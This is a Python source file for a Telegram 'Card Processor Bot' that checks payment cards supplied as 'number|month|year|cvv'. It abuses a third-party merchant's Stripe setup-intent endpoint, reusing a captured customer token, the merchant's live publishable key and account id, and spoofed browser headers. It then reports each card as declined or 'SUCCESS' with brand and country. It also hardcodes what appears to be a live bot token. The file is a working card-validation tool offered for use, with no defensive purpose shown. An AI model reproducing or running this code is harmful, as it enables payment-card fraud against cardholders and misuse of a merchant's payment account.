import telebot
import os
import requests
import json
from datetime import datetime
from flask import Flask, request

# Get environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "8480622059:AAHKRrUQK6Gw0ACZLiBLYwc9Cf9laodogVM")
AUTHOR = os.getenv("AUTHOR", "@FAHIM0200")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Store current setup intent data
current_setup_intent = None
setup_intent_creation_time = None

# Store API configurations
API_1_URL = "https://dunning.baremetrics.com/card_updates/stripe_setup_intent"
API_1_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-ch-ua': "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
    'DNT': "1",
    'sec-ch-ua-mobile': "?1",
    'Origin': "https://brainfm.baremetrics.com",
    'Sec-Fetch-Site': "same-site",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://brainfm.baremetrics.com/",
    'Accept-Language': "en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
}

API_1_PAYLOAD = {
    "token": "eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5X2lkIjoiOGM5YjcyNGYtZjY5NS00MDYxLTgxNmMtOTZjNjJmNmQ1NjNkIiwiY3VzdG9tZXJfb2lkIjoiY3VzX1STRUHVDN3ZqM3l0TWw0IiwiZXhwIjoxNzcwMjIyMjk5fQ.CcXC9IIpVzZ37lQCT-E4B0HNRMO1RwMqu6kdU-t7dx0"
}

API_2_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-ch-ua': "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
    'dnt': "1",
    'sec-ch-ua-mobile': "?1",
    'origin': "https://js.stripe.com",
    'sec-fetch-site': "same-site",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': "https://js.stripe.com/",
    'accept-language': "en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    'priority': "u=1, i"
}

# Flask app
app = Flask(__name__)

# Helper functions (same as before)
def get_setup_intent():
    global current_setup_intent, setup_intent_creation_time
    
    try:
        response = requests.post(
            API_1_URL,
            json=API_1_PAYLOAD,
            headers=API_1_HEADERS,
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            current_setup_intent = data['client_secret']
            setup_intent_creation_time = datetime.now()
            return True, "Setup intent created successfully"
        else:
            return False, f"API 1 failed: {response.status_code} - {response.text}"
            
    except Exception as e:
        return False, f"Error creating setup intent: {str(e)}"

def safe_parse_json(response_text):
    try:
        return json.loads(response_text)
    except json.JSONDecodeError:
        if '<html' in response_text.lower() or '<!doctype' in response_text.lower():
            return {'error': {'message': 'Received HTML response', 'details': response_text[:200] + '...'}}
        else:
            return {'error': {'message': 'Invalid JSON response', 'raw_response': response_text[:500]}}

def process_card(card_details, user_info):
    global current_setup_intent
    
    try:
        number, month, year, cvv = card_details.split('|')
        number = number.strip().replace(" ", "")
        month = month.strip()
        year = year.strip()
        cvv = cvv.strip()
        display_card = f"{number}|{month}|{year}|{cvv}"
    except:
        return False, "❌ Invalid format. Use: /p 4242424242424242|01|26|000"
    
    if not current_setup_intent:
        success, message = get_setup_intent()
        if not success:
            return False, f"❌ Failed to get setup intent: {message}"
    
    try:
        setup_id = current_setup_intent.split('_secret_')[0]
    except:
        return False, "❌ Invalid setup intent format"
    
    # API 2 payload (same as before)
    payload = {
        'return_url': "https://brainfm.baremetrics.com/?token=eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5X2lkIjoiOGM5YjcyNGYtZjY5NS00MDYxLTgxNmMtOTZjNjJmNmQ1NjNkIiwiY3VzdG9tZXJfb2lkIjoiY3VzX1STRUHVDN3ZqM3l0TWw0IiwiZXhwIjoxNzcwMjIyMjk5fQ.CcXC9IIpVzZ37lQCT-E4B0HNRMO1RwMqu6kdU-t7dx0",
        'payment_method_data[type]': "card",
        'payment_method_data[card][number]': number,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_year]': year,
        'payment_method_data[card][exp_month]': month,
        'payment_method_data[allow_redisplay]': "unspecified",
        'payment_method_data[billing_details][address][country]': "BD",
        'payment_method_data[referrer]': "https://brainfm.baremetrics.com",
        'payment_method_data[time_on_page]': "45638",
        'payment_method_data[client_attribution_metadata][client_session_id]': "2168281b-a4bf-461f-bec0-53a892f3c724",
        'payment_method_data[client_attribution_metadata][merchant_integration_source]': "elements",
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': "payment-element",
        'payment_method_data[client_attribution_metadata][merchant_integration_version]': "2021",
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': "deferred",
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': "automatic",
        'payment_method_data[client_attribution_metadata][elements_session_config_id]': "e9055688-6ac8-4ff8-9282-7337341fc7cb",
        'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]': "payment",
        'payment_method_data[guid]': "72106b58-27c8-4c69-ba35-8935bcc26153dd7a43",
        'payment_method_data[muid]': "f6fc48a9-c615-446b-9abf-377cab042497732b0c",
        'payment_method_data[sid]': "008ac029-9fd1-4983-857f-9365f0fc1d3cfc79a8",
        'expected_payment_method_type': "card",
        'client_context[currency]': "usd",
        'client_context[mode]': "setup",
        'client_context[setup_future_usage]': "off_session",
        'use_stripe_sdk': "false",
        'key': "pk_live_1eXe8nRGR4EcWNQSTsgrLFxb",
        '_stripe_account': "acct_15epmsDxyvLufNfy",
        'client_attribution_metadata[client_session_id]': "2168281b-a4bf-461f-bec0-53a892f3c724",
        'client_attribution_metadata[merchant_integration_source]': "elements",
        'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
        'client_attribution_metadata[merchant_integration_version]': "2021",
        'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
        'client_attribution_metadata[payment_method_selection_flow]': "automatic",
        'client_attribution_metadata[elements_session_config_id]': "e9055688-6ac8-4ff8-9282-7337341fc7cb",
        'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
        'client_secret': current_setup_intent
    }
    
    api2_url = f"https://api.stripe.com/v1/setup_intents/{setup_id}/confirm"
    
    try:
        response = requests.post(
            api2_url,
            data=payload,
            headers=API_2_HEADERS,
            timeout=30
        )
        
        response_data = safe_parse_json(response.text)
        
        if isinstance(response_data, dict) and 'error' in response_data:
            error_code = response_data['error'].get('code', '')
            
            if error_code == 'setup_intent_unexpected_state':
                success, message = get_setup_intent()
                if success:
                    setup_id = current_setup_intent.split('_secret_')[0]
                    payload['client_secret'] = current_setup_intent
                    api2_url = f"https://api.stripe.com/v1/setup_intents/{setup_id}/confirm"
                    
                    response = requests.post(api2_url, data=payload, headers=API_2_HEADERS, timeout=30)
                    response_data = safe_parse_json(response.text)
                else:
                    return False, f"❌ Setup intent failed and couldn't get new one: {message}"
        
        if isinstance(response_data, dict) and 'error' in response_data:
            error_data = response_data.get('error', {})
            
            if isinstance(error_data, dict):
                decline_code = error_data.get('decline_code', 'unknown')
                error_message = error_data.get('message', 'Unknown error')
            else:
                decline_code = 'unknown'
                error_message = str(error_data)
            
            result_text = f"❌ *DECLINED*\n\n"
            result_text += f"*Card:* `{display_card}`\n"
            result_text += f"*Decline Code:* `{decline_code}`\n"
            result_text += f"*Message:* {error_message}\n\n"
            result_text += f"*User:* {user_info}\n"
            result_text += f"*Author:* {AUTHOR}\n"
            result_text += f"*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            result_text += "━━━━━━━━━━━━━━━━━━━━━━"
            
            return False, result_text
            
        elif isinstance(response_data, dict) and 'status' in response_data:
            payment_method = response_data.get('payment_method', {})
            card_info = payment_method.get('card', {}) if isinstance(payment_method, dict) else {}
            
            result_text = f"✅ *SUCCESS!*\n\n"
            result_text += f"*Card:* `{display_card}`\n"
            result_text += f"*Status:* `{response_data.get('status', 'unknown')}`\n"
            
            if isinstance(card_info, dict):
                result_text += f"*Last 4:* `{card_info.get('last4', 'N/A')}`\n"
                brand = card_info.get('brand', 'N/A')
                result_text += f"*Brand:* `{brand.upper() if isinstance(brand, str) else 'N/A'}`\n"
                result_text += f"*Country:* `{card_info.get('country', 'N/A')}`\n"
            else:
                result_text += "*Card Details:* Not available\n"
            
            result_text += f"\n*User:* {user_info}\n"
            result_text += f"*Author:* {AUTHOR}\n"
            result_text += f"*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            result_text += "━━━━━━━━━━━━━━━━━━━━━━"
            
            return True, result_text
            
        else:
            result_text = f"⚠️ *UNEXPECTED RESPONSE*\n\n"
            result_text += f"*Card:* `{display_card}`\n"
            result_text += f"*Response:* `{str(response_data)[:200]}`\n\n"
            result_text += f"*User:* {user_info}\n"
            result_text += f"*Author:* {AUTHOR}\n"
            result_text += f"*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            result_text += "━━━━━━━━━━━━━━━━━━━━━━"
            
            return False, result_text
            
    except Exception as e:
        return False, f"❌ Error processing card: {str(e)[:200]}"

# Telegram handlers
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    welcome_text = f"""🤖 *Card Processor Bot* | Author: {AUTHOR}

*Commands:*
`/p CARD|MONTH|YEAR|CVV` - Process card
`.p CARD|MONTH|YEAR|CVV` - Process card (dot command)
`/status` - Check bot status
`/debug` - Test permissions

*Format:* number|month|year|cvv
*Example:* `/p 4242424242424242|01|26|000`
"""
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['debug'])
def debug_command(message):
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"User {message.from_user.id}"
    debug_text = f"""🔧 *Debug Info*

*User:* {user_info}
*Bot:* Online ✅
*Author:* {AUTHOR}
*Time:* {datetime.now().strftime('%H:%M:%S')}

Try `/p 4242424242424242|01|26|000`
"""
    bot.reply_to(message, debug_text, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    if current_setup_intent and setup_intent_creation_time:
        age = datetime.now() - setup_intent_creation_time
        status_text = f"🔄 *Bot Status*\n\n*Setup Intent:* Active\n*Age:* {age.seconds}s\n*Author:* {AUTHOR}"
    else:
        status_text = f"❌ *No active Setup Intent*\nUse /p command to create one.\n\n*Author:* {AUTHOR}"
    
    bot.reply_to(message, status_text, parse_mode='Markdown')

# Handle both .p and /p commands
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    text = message.text.strip()
    
    if text.startswith('.p ') or text.startswith('.P ') or text.startswith('/p ') or text.startswith('/P '):
        card_details = text[3:].strip()
        
        if '|' not in card_details or len(card_details.split('|')) != 4:
            bot.reply_to(message, "❌ Invalid format. Use: `/p 4242424242424242|01|26|000`", parse_mode='Markdown')
            return
        
        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        user_info = f"{username} ({message.from_user.id})"
        
        # Send processing message
        processing_msg = bot.reply_to(message, "🔄 *Processing card...*", parse_mode='Markdown')
        
        # Process card
        success, result = process_card(card_details, user_info)
        
        # Delete processing message and send result
        try:
            bot.delete_message(processing_msg.chat.id, processing_msg.message_id)
        except:
            pass
        
        bot.reply_to(message, result, parse_mode='Markdown')

# Flask routes
@app.route('/')
def home():
    return f"""
    <html>
        <body style="font-family: Arial, sans-serif; padding: 20px;">
            <h1>🤖 Card Processor Bot</h1>
            <p><strong>Status:</strong> Running ✅</p>
            <p><strong>Author:</strong> {AUTHOR}</p>
            <p><strong>Bot:</strong> @FAHIM0200's Card Processor</p>
            <p>Find the bot on Telegram to use it.</p>
        </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'Bad request', 400

# Main
if __name__ == '__main__':
    print("🤖 Starting Card Processor Bot...")
    print(f"👤 Author: {AUTHOR}")
    
    # Remove any existing webhook
    bot.remove_webhook()
    
    # Get port for Render
    port = int(os.getenv("PORT", 5000))
    
    # Note: Webhook will be set after deployment
    # You'll set it manually once you get your Render URL
    
    print(f"🌐 Server running on port {port}")
    print("✅ Bot is ready!")
    
    # Start Flask app
    app.run(host='0.0.0.0', port=port)
